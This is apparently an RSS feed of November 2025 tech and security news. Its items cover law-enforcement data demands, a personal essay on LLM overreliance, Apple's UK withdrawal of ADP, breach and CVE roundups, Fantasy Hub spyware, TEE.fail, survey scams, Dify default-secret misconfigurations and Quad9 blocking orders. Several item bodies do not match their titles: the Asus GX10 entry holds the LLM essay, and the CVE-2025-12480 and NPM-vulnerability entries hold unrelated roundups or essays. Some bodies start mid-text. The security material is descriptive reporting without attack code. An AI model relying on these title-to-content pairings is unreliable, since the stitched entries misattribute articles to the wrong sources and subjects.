what to share, but on the legal process. Smaller hosts, like those of decentralized services, might be intimidated by these requests, but consulting legal counsel will ensure requests are challenged when necessary. Organizations like EFF can sometimes provide legal help directly or connect service providers with alternative counsel.It’s not uncommon for law enforcement to overreach or make burdensome requests. Before offering information, services can push back on an improper demand informally, and then continue to do so in court. If the demand is overly broad, violates a user's First or Fourth Amendment rights, or has other legal defects, a court may rule that it is invalid and prevent disclosure of the user’s information.Even if a court doesn’t invalidate the legal demand entirely, pushing back informally or in court can limit how much personal information is disclosed and mitigate privacy impacts.Unless otherwise restricted, service providers should give notice about requests and disclosures as soon as they can. This notice is vital for users to seek legal support and prepare a defense.It is important for users to understand if a host is committed to pushing back on data requests to the full extent permitted by law. Privacy policies with fuzzy thresholds like "when deemed appropriate" or “when requested” make it ambiguous if a user’s right to privacy will be respected. The best practices for providers not only require clarity and a willingness to push back on law enforcement demands, but also a commitment to be transparent with the public about law enforcement’s demands. For example, with regular transparency reports breaking down the countries and states making these data requests.You can't be compelled to disclose data you don’t have. If you collect lots of user data, law enforcement will eventually come demanding it. Operating a service typically requires some collection of user data, even if it’s just login information. But the problem is when information starts to be collected beyond what is strictly necessary. This excess collection can be seen as convenient or useful for running the service, or often as potentially valuable like behavioral tracking used for advertising. However, the more that’s collected, the more the service becomes a target for both legal demands and illegal data breaches. For data that enables desirable features for the user, design choices can make privacy the default and give users additional (preferably opt-in) sharing choices. As another minimization strategy, hosts should regularly and automatically delete information when it is no longer necessary. For example, deleting logs of user activity can limit the scope of law enforcement’s retrospective surveillance—maybe limiting a court order to the last 30 days instead of the lifetime of the account. Again design choices, like giving users the ability to send disappearing messages and deleting them from the server once they’re downloaded, can also further limit the impact of future data requests. Furthermore, these design choices should have privacy-preserving defaultDepending on the service being hosted there may be some need to rely on  service to make everything work for users. Third-party login or ad services are common examples with some amount of tracking built in. Information shared with these third-parties should also be minimized and avoided, as they may not have a strict commitment to user privacy. Most notoriously, data brokers who sell advertisement data can provide another legal work-around for law enforcement by letting them simply buy collected data across many apps. This extends to decisions about what information is made public by default, thus accessible to many third parties, and if that is clear to users.Now that HTTPS is actually everywhere, most traffic between a service and a user can be easily secured—for free. This limits what onlookers can collect on users of the service, since messages between the two are in a secure “envelope.” However, this doesn’t change the fact the service is opening this envelope before passing it along to other users, or returning it to the same user. With each opened message, this is more information to defend.Better, is end-to-end encryption (e2ee), which just means providing users with secure envelopes that even the service provider cannot open. This is how a featureful messaging app like Signal can respond to requests with only three pieces of information: the account identifier (phone number), the date of creation, and the last date of access. Many services should follow suit and limit access through encryption.Note that while e2ee has become a popular marketing term, it is simply inaccurate for describing any encryption use designed to be broken or circumvented. Implementing “encryption backdoors” to break encryption when desired, or simply collecting information before or after the envelope is sealed on a user’s device (“client-side scanning”) is antithetical to encryption. Finally, note that e2ee does not protect against law enforcement obtaining the contents of communications should they gain access to any device used in the conversation, or if message history is stored on the server unencrypted.Protecting Yourself and Your CommunityAs outlined, often the security of your personal data depends on the service providers you choose to use. But as a user you do still have some options. EFF’s Surveillance Self-Defense is a maintained resource with many detailed steps you can take. In short, you need to assess your risks, limit the services you use to those you can trust (as much as you can), improve settings, and when all else fails, accessorize with tools that prevent data sharing in the first place—like EFF’s Privacy Badger browser extension.Remember that privacy is a team sport. It’s not enough to make these changes as an individual, it’s just as important to share and educate others, as well as fighting for better digital privacy policy on all levels of governance. Learn, get organized, and take action.]]></content:encoded></item><item><title>Asus Ascent GX10</title><link>https://www.asus.com/networking-iot-servers/desktop-ai-supercomputer/ultra-small-ai-supercomputers/asus-ascent-gx10/</link><author>jimexp69</author><category>dev</category><pubDate>Mon, 10 Nov 2025 15:56:57 +0000</pubDate><source url="https://news.ycombinator.com/best">Best of HackerNews</source><content:encoded><![CDATA[

I would bet this happens all the time. And I can’t help but wonder what the effects are in the big picture.I can relate to this on a personal level: As I ChatGPT user I notice that I’m often left with a sense of certainty. After discussing an issue with an LLM I feel like I know something — a lot, perhaps — but more often than not this information is either slightly incorrect or completely wrong. And you know what? I can’t help it. Even when I acknowledge this illusion, I can’t help chasing the wonderful feeling of conviction these models give. It’s great to like you know almost everything. Of course I come back for more. And it’s just not the feeling; I would be dishonest to claim these models wouldn’t have huge utility. Yet I’m a little worried about the psychological dimension of this whole ordeal.They say AI is a mirror. This summarizes my experience. I feel LLMs “amplify” thinking. These models make your thoughts reverberate by taking them to multiple new directions. And sometimes these directions are really interesting. The thing is, though, that this goes both ways: A short ChatGPT session may help improve a good idea to a great idea. On the other hand, LLMs are amazing at supercharging self-delusion. These models will happily equip misguided thinking with a fluent, authoritative voice, which, in turn, sets up a psychological trap by delivering nonsense in a nice package.And it’s so insanely habit-forming! I almost instinctively do a little back and forth with an LLM when I want to work on an idea. It hasn’t even been that long (these models have been around for, what, three years?) and I’m so used to them that I feel naked without. It’s getting even comical sometimes. When I lost my bag the other day and was going through the apartment looking for it, my first response to my growing frustration was that “I should ask ChatGPT where it is”.I feel like LLMs are a fairly boring technology. They are stochastic black boxes. The training is essentially run-of-the-mill statistical inference. There are some more recent innovations on software/hardware-level, but these are not LLM-specific really. Is it too sardonic to say that the real “innovation” was throwing enough money at the problem to train the models at a huge scale? Maybe RLHF was a real innovation; I’m not sure. However, I don’t really feel like there is a lot to be interested in there. And yet, the current AI boom is extraordinarily interesting.It’s the impact. The very real effect of all this in our lives. In hindsight, this will probably be one of the major shifts, and it will be reflected upon in terms of education, work and even society at large. Language cuts to the core of what and who we are. Speech is so natural to us that we even think in speech. And when a machine credibly stepped into that territory, something changed. I’m not sure what it is — I don’t think anyone really knows at this point — but I think there is a  of shifting tides. I think it’s something most of us are trying to make sense of.I think LLMs should  be seen as knowledge engines but as confidence engines. That, I feel, would better illustrate the potential near and medium-term futures we are dealing with.]]></content:encoded></item><item><title>5 reasons why attackers are phishing over LinkedIn</title><link>https://www.bleepingcomputer.com/news/security/5-reasons-why-attackers-are-phishing-over-linkedin/</link><author>Sponsored by Push Security</author><category>security</category><pubDate>Mon, 10 Nov 2025 15:01:11 +0000</pubDate><source url="https://www.bleepingcomputer.com/">BleepingComputer</source><content:encoded><![CDATA[Attackers are increasingly phishing over LinkedIn to reach executives and bypass email security tools.

(No, they were not amused.) In my defense, I proceeded to explain to them that having de-Googled, I was also in the process of de-Appling, which is a special bonus level that those of us in the UK have unlocked.If you’re reading this in the sunlit uplands, you need to start that too.You need to start that because, as we recently learned, at some point in the very near future Apple is withdrawing its Advanced Data Protection (ADP) feature from the UK altogether as a result of the Home Office TCN through the Investigatory Powers Act.Users who already had ADP enabled when the first TCN became public in February will be required to manually switch it off or lose their iCloud account.I am not going to explain the chapter and verse of the legal saga today, because I prefer to do that for people who pay me to explain them the chapter and verse.But I will say that the shutdown of ADP is Apple being  of the geopolitical fight, as inconvenient as that may be to you and me.hen the whole debacle blew up in February, Apple announced that ADP would no longer be available for new users, but would remain unaffected for those of us who already had it activated. That assurance was nothing to sleep on, and so we have been waiting for the inevitable. Apple’s September update confirmed that its days are numbered:For users in the UK who already enabled Advanced Data Protection, Apple will soon provide additional guidance. Apple cannot disable ADP automatically for these users. Instead, UK users will be given a period of time to disable the feature themselves to keep using their iCloud account.So what does that mean for you? Again, from their September update:Withdrawing Advanced Data Protection from the UK will not affect the 15 iCloud data categories that are end-to-end encrypted by default. Data like iCloud Keychain and Health remains protected with full end-to-end encryption.
Our communication services, like iMessage and FaceTime, remain end-to-end encrypted globally, including in the UK.
Users in the UK who have not already enabled Advanced Data Protection will no longer have the option to do so. That means the 10 iCloud data categories covered by ADP will be protected by Standard Data Protection, and UK users will not have a choice to benefit from end-to-end encryption for these categories: iCloud Backup; iCloud Drive; Photos; Notes; Reminders; Safari Bookmarks; Siri Shortcuts; Voice Memos; Wallet Passes; and Freeform.This means that  you need to get everything in that list –  iCloud Backup, iCloud Drive, Photos, Notes, Reminders, Safari Bookmarks, Siri Shortcuts, Voice Memos, Wallet Passes, and Freeform – off of iCloud sooner rather than later.Once you’ve done that, go into your iCloud settings, click on Manage, then click on each thing individually to purge it off iCloud.I’m not going to tell you where to move your stuff other than to say that if you’re moving it from one big tech company to another, you’re just being daft. Likewise, if you’re moving your stuff to a non-e2ee service, don’t bother. If you need an e2ee service try Proton. They have a Black Friday sale on.If you have a lot of , first download the Exporter app from the app store. It does what it says on the tin. You’ll end up with a folder full of markdown files which you can upload elsewhere. E2EE being the dealbreaker, I chose Standard Notes. I know a lot of folk who prefer Obsidian or Joplin. Whatever you choose, do not use a non-E2EE note service.*What about the non-e2ee stuff in iCloud?The full list of what lives in iCloud and how it is or is not encrypted is here.We know from the tiny bits of the TCN saga which have been publicly disclosed, thanks to the only two media outlets that are bothering to cover it, that the first TCN was not just for the end-to-end encrypted data protected by ADP. It was for anything on iCloud, full stop, worldwide:…however, the new IPT filing states the TCN “is not limited to” data stored under ADP, suggesting the UK government sought bulk interception access to Apple’s standard iCloud service, which is much more widely used by the company’s customers. The TCN also included “obligations to provide and maintain a capability to disclose categories of data stored within a cloud-based backup service”, the filing states, which suggests the government sought to tap messages or passwords that were backed up in the cloud as well. “The obligations included in the TCN are not limited to the UK or users of the service in the UK; they apply globally in respect of the relevant data categories of all iCloud users,” the IPT filing adds.This means that you have some serious thinking to do about what you intend to trust to the Apple stack altogether going forward, even things like passwords.I can’t tell you what to do but once again, you have options. Educate yourself. Consider the opsec and persec needs not just of yourself, but for the people around you who could be adversely affected by insecure data going walkies out of your account.What if I’m not in the UK?This impacts the UK only: as their September update noted, Advanced Data Protection continues to be available everywhere else in the world. It does mean that if you have someone in the UK on your team, you need to factor them in as part of your threat model. We are all liabilities to our own opsec now.If you’re not in the UK, and you don’t have ADP activated, take 10 seconds to do it right now, you lucky sod.
Settings > Your name Apple Account > iCloud > Advanced Data ProtectionWhat about that second TCN?Those who follow my work know that this phrase made me spew a double barrel of Glaswegian swearing.  British  data, as opposed to British  data? The dividing line here is not e.g. being located in the UK or having registered an account here, but what it says on your passport? How is Apple going to know that, much less roll it out? (/s)Did Apple just publicly state that they’re going to be removing a security layer  adding a nationality check layer? We don’t know because as with the first TCN, that information only became available in the public domain due to someone leaking it to the media. That’s all there is to know. Everything else is confidential and NCND. There is nothing else to say because nothing else is known. If someone who did know something was sitting across from me right now, and they told me, they would be committing a crime.Those of us who care about these things enough to show up in difficult places are keeping tabs on both TCNs, and the wider legal and technical implications of both, as best we possibly can. Don’t expect to hear anything more until January, when the Liberty/PI challenge on the first TCN goes to the Investigatory Powers Tribunal. In the interim, if you want me to bore you about ECHR case law and how the UK’s review into Article 8 seems a little too coincidentally timed, pick a pub.Otherwise, please make sure you de-Apple, de-Google, and de-American Stack yourself when you have time, clarity, and focus to do it. Start today.Above all, please remember that this  the sunlit uplands. That’s the thing about Brexit Britain having decided to go it alone where tech regulation is concerned. It did not become the vanguard of a “world-leading” third way.It became a small and inconsequential thing easily thrown under a bus.Header image by me: Alan Turing memorial, Manchester, where he reminds you why keeping data private can be a matter of life and death.Don’t ask how I’m going to top this.*For the love of the wee man do not use a non-e2ee notetaking app which has been abandoned by an owner who has a track record of personally snooping through user data when he’s in a mood, i.e. if he’s breathing.]]></content:encoded></item><item><title>CVE-2025-12480 - Triofox Improper Access Control</title><link>https://cvefeed.io/vuln/detail/CVE-2025-12480</link><author></author><category>vulns</category><pubDate>Mon, 10 Nov 2025 14:20:40 +0000</pubDate><source url="https://cvefeed.io/vuln/latest/">CVE Feed High</source><content:encoded><![CDATA[CVE-2025-12480

The incident may have led to the compromise of draft reports, economic forecasts, internal emails, and other confidential data. The attack has been attributed to the Chinese state-sponsored APT group known as Silk Typhoon.Hyundai AutoEver America was hit by a cyber attack that resulted in unauthorized access to its IT environment, exposing sensitive personal information, including names, Social Security Numbers, and driver’s license numbers. The attack, which occurred between February 22 and March 2, 2025, affected employees, customers, or users, although the exact number of affected individuals remains unclear.Swedish IT systems supplier Miljödata has suffered a data breach that resulted in the exposure and theft of personal data belonging to up to 1.5 million individuals, including names, email addresses, physical addresses, phone numbers, government IDs, and dates of birth. The incident disrupted operations across multiple Swedish municipalities, affecting both children and protected identity subjects. The stolen data was published on the dark web by the threat group Datacarry.Japanese media giant Nikkei has experienced a cyber-attack caused by malware infection. The attack resulted in unauthorized access to its Slack messaging platform, exposing the personal information of over 17,000 employees and business partners, including names, email addresses, and chat histories.Polish online loan platform SuperGrosz, operated by AIQLABS, has disclosed a breach exposing personal data of at least 10,000 customers, including names, addresses, ID and tax numbers, phone contacts, employment details, and bank account numbers. The disclosure follows a separate distributed denial-of-service (DDoS) attack on a Polish mobile payment leader Blik that disrupted instant transfers and cash withdrawals. No actor has claimed responsibility, though Polish authorities have suggested a possible Russian link to the Blik attack.SonicWall has confirmed that a state-sponsored threat actor was behind the September attack that resulted in the theft of all firewall configuration files stored in its cloud backup environment via an API call. The breach exposed encrypted credentials and device configuration data contained in those files, enabling potential targeted attacks. All customers who used the cloud backup service were affected.VULNERABILITIES AND PATCHESCheck Point Research has uncovered four critical vulnerabilities in Microsoft Teams that allow attackers to impersonate users, manipulate messages, notifications, displayed names and forge caller identities in video and audio calls. Microsoft fixed the flaws and officially tracked the notification spoofing flaw as CVE-2024-38197.Check Point Research detected an exploit that drained $128.64M from Balancer V2. The attacker combined a rounding error vulnerability in a certain function with carefully crafted batchSwap operations. It allowed the attacker to artificially suppress Balancer Pool Token prices and extract value through repeated arbitrage cyclesA critical remote command execution vulnerability, CVE-2025-48703, affecting CentOS Web Panel (CWP) versions prior to 0.9.8.1204 is actively being exploited in the wild It enables remote, unauthenticated attackers with knowledge of a valid username to execute arbitrary shell commands as that user. A patch addressing the issue was released in version 0.9.8.1205.Point IPS provides protection against this threat (CentOS Web Panel Command Injection (CVE-2025-48703))Cisco warns of a new attack variant targeting Secure Firewall ASA and FTD that exploits CVE-2025-20333 (RCE as root via crafted HTTP) and CVE-2025-20362 (unauthenticated restricted-URL access), causing unpatched devices to reload into DoS. Both flaws were previously abused as zero-days in late September to deliver RayInitiator and LINE VIPER malware.Point IPS provides protection against this threat (Cisco Multiple Products Buffer Overflow (CVE-2025-20333); Cisco Multiple Products Authentication Bypass (CVE-2025-20362))THREAT INTELLIGENCE REPORTSCheck Point Research demonstrated a new way to use ChatGPT for malware analysis directly from the web interface, analyzing XLoader malware. The workflow using exported IDA data enables static analysis, rapid decryption, IoC extraction, and hidden C2 discovery.Point Threat Emulation and Harmony Endpoint provide protection against this threat (Trojan.Wins.Xloader; Trojan.Win.Xloader; Trojan.Wins.Xloader.ta.*)Check Point discovered AI-driven pharma scams that deepfake doctors and clinics to sell counterfeit drugs. Infrastructure shows more than 500 fake social pages daily using shared IPs, cloned site kits, AI imagery, deepfake ads/voice cloning, and spoofed clinic sites, with automated “fraud kits”.Researchers identified AI-powered malware families, including FRUITSHELL, PROMPTSTEAL and QUIETVAULT which were observed in operations. These malware strains leveraged LLMs like Gemini for evasive, dynamic attacks on Ukraine and worldwide victims. The researchers also found PROMPTFLUX, an experimental malware family that employed AI capabilities mid-execution to dynamically alter the malware’s behavior.]]></content:encoded></item><item><title>Lawsuit Alleges Ex-Intel Employee Hid 18,000 Sensitive Documents Prior to Leaving the Company</title><link>https://databreaches.net/2025/11/10/lawsuit-alleges-ex-intel-employee-hid-18000-sensitive-documents-prior-to-leaving-the-company/?pk_campaign=feed&amp;pk_kwd=lawsuit-alleges-ex-intel-employee-hid-18000-sensitive-documents-prior-to-leaving-the-company</link><author>Dissent</author><category>databreach</category><pubDate>Mon, 10 Nov 2025 13:29:43 +0000</pubDate><source url="https://databreaches.net/">Recent Data breaches</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>HIPAA, but for non-Covered Entities?</title><link>https://databreaches.net/2025/11/10/hipaa-but-for-non-covered-entities/?pk_campaign=feed&amp;pk_kwd=hipaa-but-for-non-covered-entities</link><author>Dissent</author><category>databreach</category><pubDate>Mon, 10 Nov 2025 13:29:36 +0000</pubDate><source url="https://databreaches.net/">Recent Data breaches</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>Fantasy Hub is spyware for rent—complete with fake app kits and support</title><link>https://www.malwarebytes.com/blog/news/2025/11/fantasy-hub-is-spyware-for-rent-complete-with-fake-app-kits-and-support</link><author></author><category>threatintel</category><pubDate>Mon, 10 Nov 2025 13:26:52 +0000</pubDate><source url="https://www.malwarebytes.com/">Malwarebytes Labs</source><content:encoded><![CDATA[Researchers at Zimperium identified Fantasy Hub, a new Android spyware developed and sold as a subscription on Russian-language cybercrime forums.Malware-as-a-Service (MaaS) means cybercriminals rent out to malware to other criminals, complete with the infrastructure necessary to harvest and abuse stolen information. Usually, it’s up to the buyer to spread the malware, but Fantasy Hub goes a step further—it comes with full documentation, video tutorials, and a subscription model that makes it easy for even inexperienced attackers to use. Its creators provide step-by-step guides to create fake Google Play pages that imitate apps like Telegram or online banking portals, complete with realistic reviews. It’s a Remote Access Trojan (RAT) that anyone can distribute.Distribution relies heavily on social engineering and phishing. Attackers use Fantasy Hub’s templates and tools to set up convincing fake app pages, tricking users into downloading the malicious software. A “dropper” option even lets buyers upload any Android app APK and get back a modified version with Fantasy Hub added.These counterfeit apps look legitimate, and often request only a single permission: SMS access. But that permission unlocks much more. The SMS handler role bundles multiple powerful permissions: contacts, camera, and file access into a single authorization step, unlocking extensive control over the device’s messaging, contacts, and camera functions. Fantasy Hub is designed to bypass standard security checks and can remain concealed, making detection difficult for users.Once installed, Fantasy Hub can steal SMS messages, call logs, contacts, photos, and videos. It can also intercept, reply to, and delete notifications. More dangerously, it can initiate live audio and video streams using the device’s camera and microphone without the user’s consent. It’s been found in imitation banking apps, displaying fake windows to harvest user credentials such as usernames, PINs, and passwords. As part of the handy pack provided by Fantasy Hub’s creators, attackers are given tools to tailor these phishing windows for almost any banking app they wish to target.While individuals at at risk from this malware, the threat extends to organizations that use Bring Your Own Device (BYOD) policies or rely on mobile banking and work apps. A single infected phone could expose company data or communications.Fantasy Hub shows how easily cybercriminals can now buy and run complex spyware. But a few simple habits can help you stay safe:Stick to trusted sources. Download apps only from Google Play, Apple’s App Store, or the official provider. Your bank will never ask you to use another source. Use an up-to-date real-time anti-malware solution like Malwarebytes for Android, which already detects this malware as Android/Trojan.Spy.ACRF949851CC4. Does it really need the permissions it’s requesting to do the job you want it to do? Especially if it asks for SMS or camera access.Unsolicited communications. Stay wary of messages, emails, or links urging you to “update” or install outside the official app stores.We don’t just report on phone security—we provide it]]></content:encoded></item><item><title>Critical Vulnerability in Popular NPM Library Exposes AI and NLP Apps to Remote Code Execution</title><link>https://cybersecuritynews.com/npm-library-vulnerability/</link><author></author><category>security</category><pubDate>Mon, 10 Nov 2025 13:14:30 +0000</pubDate><source url="https://cvefeed.io/rssfeed/newsroom.xml">Latest Newsroom</source><content:encoded><![CDATA[

What we have are secure enclaves. I’ve written about this before:Almost all cloud services have to perform some computation on our data. Even the simplest storage provider has code to copy bytes from an internal storage system and deliver them to the user. End-to-end encryption is sufficient in such a narrow context. But often we want our cloud providers to be able to perform computation on our raw data: search, analysis, AI model training or fine-tuning, and more. Without expensive, esoteric techniques, such as secure multiparty computation protocols or homomorphic encryption techniques that can perform calculations on encrypted data, cloud servers require access to the unencrypted data to do anything useful.Fortunately, the last few years have seen the advent of general-purpose, hardware-enabled secure computation. This is powered by special functionality on processors known as trusted execution environments (TEEs) or secure enclaves. TEEs decouple who runs the chip (a cloud provider, such as Microsoft Azure) from who secures the chip (a processor vendor, such as Intel) and from who controls the data being used in the computation (the customer or user). A TEE can keep the cloud provider from seeing what is being computed. The results of a computation are sent via a secure tunnel out of the enclave or encrypted and stored. A TEE can also generate a signed attestation that it actually ran the code that the customer wanted to run.Secure enclaves are critical in our modern cloud-based computing architectures. And, of course, they have vulnerabilities:The most recent attack, released Tuesday, is known as TEE.fail. It defeats the latest TEE protections from all three chipmakers. The low-cost, low-complexity attack works by placing a small piece of hardware between a single physical memory chip and the motherboard slot it plugs into. It also requires the attacker to compromise the operating system kernel. Once this three-minute attack is completed, Confidential Compute, SEV-SNP, and TDX/SDX can no longer be trusted. Unlike the Battering RAM and Wiretap attacks from last month—which worked only against CPUs using DDR4 memory—TEE.fail works against DDR5, allowing them to work against the latest TEEs.Yes, these attacks require physical access. But that’s exactly the threat model secure enclaves are supposed to secure against.]]></content:encoded></item><item><title>New Browser Security Report Reveals Emerging Threats for Enterprises</title><link>https://thehackernews.com/2025/11/new-browser-security-report-reveals.html</link><author>The Hacker News</author><category>security</category><enclosure url="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgXmfzDsP62FvRPwIyRZdDAPcaehng_GAhvSGbVAVkKWjMNyxews4CW0LRurCcsr3Wt2XCRsHWZhnOcHb3RjeKNRjsWLE_QxFNXfxEHm8LQoN5ecufFEZc-ARX6ZEl85Klpq4Z_1CsjybYHBXtUCo2kfydWn9ktUBCrTZrHHpm0aIkMX3fJAdflArlX-84/s1600/browser.jpg" length="" type=""/><pubDate>Mon, 10 Nov 2025 11:58:06 +0000</pubDate><source url="https://thehackernews.com/">The Hacker News</source><content:encoded><![CDATA[According to the new Browser Security Report 2025, security leaders are discovering that most identity, SaaS, and AI-related risks converge in a single place, the user’s browser.

All you have to do is answer a few questions. It looks harmless enough. But once you click, you find yourself in a maze of surveys, redirects, and “partner offers”—without ever actually reaching the end and claiming your prize.This so-called “survey” is part of a lead-generation and affiliate marketing scam, designed not to reward you but to harvest your data and push you through ad funnels that make money for others, at the cost of your privacy. It’s a scam because these pages rarely deliver any real gift card. What they’re after is your personal data.As you move through each step, you’re asked for details like your name, email, phone number, ZIP code and even your home address. In some cases, you’re prompted to share interests such as home repair, debt help, or insurance quotes—each answer helps categorize you for targeted marketing.Even if the page itself doesn’t steal money, that information is still valuable. It can be used to target you with more ads and offers, add you to marketing lists, or personalize follow-up contact. In other words, completing the questionnaire hands over data that can be exploited for profit—even when no gift card ever appears.In some cases, the funnel gets even more specific. For example, if the survey asks you about home projects and you say you’re planning to replace your windows, you might be redirected to what looks like a legitimate home improvement site—often just another form asking for the same details again. The whole thing is designed to keep you filling out more forms, giving up more of your data, to more websites and affiliates.These scams aren’t just annoying time-wasters. They are harvesting your data, eroding your privacy and exposing you to wider risks. Once your details are shared, they can travel far beyond that fake survey.Be resold to advertisers and data brokers, who build detailed profiles about your habits, spending, and location.Lead to a surge of spam calls, texts, and phishing emails tailored to your interests.Feed more convincing scams down the line, since criminals can now personalize their lures using real information about you.End up on unregulated marketing lists that circulate for years, keeping your data in play long after you’ve closed the page.That’s the hidden cost of a “free” gift card: each click fuels a network that profits from your identity, not your participation.Why do people fall for it?The hook is simple—free money and easy participation. But this fake Walmart promotion taps into three powerful psychological triggers:: “You’ve been selected!” sounds personal and special.The promise of low effort: Answering a few questions feels harmless.The illusion of credibility: Walmart’s branding lends legitimacy.These scams spread mainly through advertising and malvertising networks—pop-ups, spam emails, social media ads, or sketchy website banners that imitate real promotions.You might spot them alongside news articles or as “sponsored links” that sound too good to be true. Some appear via push notifications or redirects, whisking you from a real website to a fake reward page in seconds.The designs often use official logos, countdown timers, and congratulatory language to make them look like authentic brand campaigns—tricking people into lowering their guard.It’s an easy mental shortcut: “If this was fake, it wouldn’t look so professional.” That’s what these scammers count on—the appearance of legitimacy mixed with urgency and reward.These gift card offers aren’t just harmless internet fluff—they’re the front door to a sprawling network of data collection and affiliate profiteering. Each click, form, and redirect is designed to extract value from your attention and information, not to reward you.Recognizing these scams early is the best defense. Here’s how to stay safe:Be suspicious of online surveys promising big rewards. Legitimate promotions from major retailers rarely require long questionnaires or partner offers.Never give personal information to unknown pages. If a site asks for your phone number or address for a “free prize,” it’s a red flag.Use browser protection tools. Extensions like Malwarebytes Browser Guard can block known scam domains and malvertising networks before they load. Real Walmart promotions will always come from official domains (like walmart.com or survey.walmart.com), not random URLs with extra words or numbers.Stay alert and skeptical. Online quizzes and reward offers are a favorite bait for scammers. When in doubt – close the tab.We don’t just report on scams—we help detect themCybersecurity risks should never spread beyond a headline.

In this research, I mainly focused on local deployments. I found that certain misconfigurations keep appearing across real-world instances, including at large enterprises, putting those organizations and their critical assets at risk.Misconfiguration #1. Default API-Keys and SecretsIn local Dify installations — whether you’re building the product from the source or using the pre-made Docker image, some services are exposed to the public.Building Dify from source requires setting up several services, this is done by launching Docker containers from a docker-compose file called docker-compose.middleware.yaml.Looking at the docker-compose file, you can see that some services are exposed to the host machine (and potentially to the public).Dify, like most products, ships with different API keys and secrets for different services. But there’s a problem: most of these keys and secrets aren’t generated during installation — they’re static and hard-coded — and nothing forces users to change them during setup. This leads to the unfortunate situation where most servers end up keeping the default API keys and secret values, which are publicly known.To verify if this is actually a problem in the real-world, I picked two services and checked their statistics across public servers.Service — Runs  and hosts the database that manages everything Dify needs in order to to run.Dify’s default password for the  user is . I randomly tested 20 servers to see how many kept the default password— turns out 70% of them were still using it. — This service manages the plugins used by Dify (like the GitHub addon and web search tool) and handles communication with LLM models. The next section covers this service in more detail, including how it can be exploited and some statistics.How can attacker abuse this misconfigurations?Each one of the services, if compromised, has the potential to let an attacker compromise the entire Dify instance. The fact that some of these services use default secrets and API keys (which are publicly known) makes them easy targets.While I’m not going to cover every service, I will take a closer look at one in particular: .plugin-deamon service takeoverDify Plugin Daemon is a service that manages the lifecycle of plugins. It’s written mostly in Go and exposes two interfaces:HTTP interface on port  (used by the main Dify API server to install plugins, invoke LLM model queries, and more)TCP interface on port  (for remote plugin installation)While there are also some issues with the TCP interface, we’re going to focus on the HTTP interface running on port 5002.The HTTP interface is defined in the  file. The server starts by defining some base routes (, , ), then adds sub-routes under each one.]]></content:encoded></item><item><title>DNS Provider Quad9 Sees Piracy Blocking Orders as &quot;Existential Threat&quot;</title><link>https://torrentfreak.com/dns-provider-quad9-sees-piracy-blocking-orders-as-existential-threat/</link><author>gslin</author><category>dev</category><pubDate>Mon, 10 Nov 2025 11:21:47 +0000</pubDate><source url="https://news.ycombinator.com/best">Best of HackerNews</source><content:encoded><![CDATA[The move was a major enforcement escalation by French rightsholders, but in hindsight it was only the beginning.In the months that followed, additional rightsholders such as DAZN and beIN joined in on the action with similar requests, while more DNS providers were added as targets, including Quad9 and Vercel. This pitted notably smaller players against these billion-dollar companies in court.Quad9 was no stranger to site blocking requests, having previously dealt with a similar legal battle in Germany. That said, for the small Swiss non-profit organization, these proceedings are more than a legal disagreement. They present an existential threat. For billion-dollar tech companies Google and Cloudflare, dealing with these legal challenges is a nuisance, but they have the means to fight back. In a recent blog post, Quad9 explains that its foundation doesn’t have this luxury. “For large commercial players such as Google, Cloudflare, or Cisco, these costs — legal, lobbying, or engineering — are absorbed as part of their business overhead.“For small, mission-driven nonprofits like Quad9, they represent an existential threat,” the DNS provider adds. Ideally Quad9 would like to defend itself in these blocking cases, as Google and Cloudflare have done. However, since it doesn’t have the financial resources to do so, it chose not to make an appearance in one of the recent site-blocking cases. Breaking the Internet’s PlumbingQuad9 argues that copyright holders are increasingly trying to hold neutral intermediaries liable for piracy. Instead of going after the infringers directly, ISPs, VPNs, and DNS providers have to take on the enforcement burden.This is particularly problematic for smaller operations that, according to Quad9, simply don’t have the means to do so indefinitely. Not only that, by going after DNS providers, these orders also directly affect key internet infrastructure providers.“Instead of targeting the platforms that profit from infringement, IP owners are increasingly going after the neutral infrastructure providers that simply make the internet work,” Quad9 writes.In response to the French blocking efforts, Cisco decided to leave France, so the effects of these measures are already being felt. Other companies, such as Google and Cloudflare, have the technical means to restrict the blockades to France, but not all providers can do so easily. That includes Quad9, which had no other choice than to apply the French blocking request worldwide.In France, the courts have clearly decided that these blocking orders are warranted, and while some are under appeal, there’s no indication that they will be reversed anytime soon. That said, Quad9 believes that a broader discussion is warranted, and it poses several questions that go to the heart of how the internet should function.In its blog post, the foundation asks, among other things:“Should neutral, technical infrastructure be held responsible for the actions of others?”“How far should courts reach across jurisdictions to impose national laws on global networks?”“Can small nonprofits survive under legal obligations designed for global corporations?”“What happens to privacy and resiliency when only a handful of corporations can afford to comply?”“At what point does legal compliance become de facto censorship?”These are not just rhetorical questions for the Swiss non-profit. After fighting and winning a multi-year, costly legal battle against Sony in Germany, Quad9’s “existential threat” has reemerged in France.Ultimately, Quad9 warns that these blocking battles may lead to a less open, less private, and more centralized internet, leaving the “plumbing” in the hands of a few corporate giants who can afford to pay the legal bills.]]></content:encoded></item><item><title>Monsta FTP Vulnerability Exposed Thousands of Servers to Full Takeover</title><link>https://hackread.com/monsta-ftp-flaw-web-servers-open-server-takeover/</link><author></author><category>security</category><pubDate>Mon, 10 Nov 2025 10:53:49 +0000</pubDate><source url="https://cvefeed.io/rssfeed/newsroom.xml">Latest Newsroom</source><content:encoded><![CDATA[

While the robustness of Windows NT in decades past might qualify as "legendary", anybody who has had to use the company's wares in recent years might quibble with the word "quality."As repeated Azure outages due to configuration errors have shown, "control" is perhaps also inappropriate these days.It's difficult to pinpoint precisely where it went wrong for Microsoft when it comes to quality. In 2014, the company decided it could do without many of its testers. Mary Jo Foley reported that "a good chunk" were being laid off. Microsoft didn't need to bother with traditional methods of testing code. Waterfall was out. Agile was in.The consequences have been difficult to avoid. There was the infamous Windows 10 Update Of The Damned (also known as the Windows 10 October 2018 Update), which deleted files, and despite Microsoft slowing down the release cadence after that, quality does not seem to have improved. Every few weeks, the company's "legendary approach to quality control" is evident, whether through a self-inflicted wound resulting from issues with an update or, worse, the company's cloud collapsing due to a faulty configuration change being rolled out.While allowances can be made for the former – the Windows ecosystem consists of hundreds of millions of devices, and some issues are inevitable (even if others are inexcusable) – the same cannot be said for the latter. Sure, Azure is vast, but it should be a known quantity as far as Microsoft is concerned. Therefore, repeatedly rolling out changes to production that leave customers with inoperative services is more than questionable quality control; it calls into question the company's competence.As the saying goes, "Fool me once, shame on you. Fool me over and over again ... well, I guess that makes me a Microsoft customer."So perhaps it is time 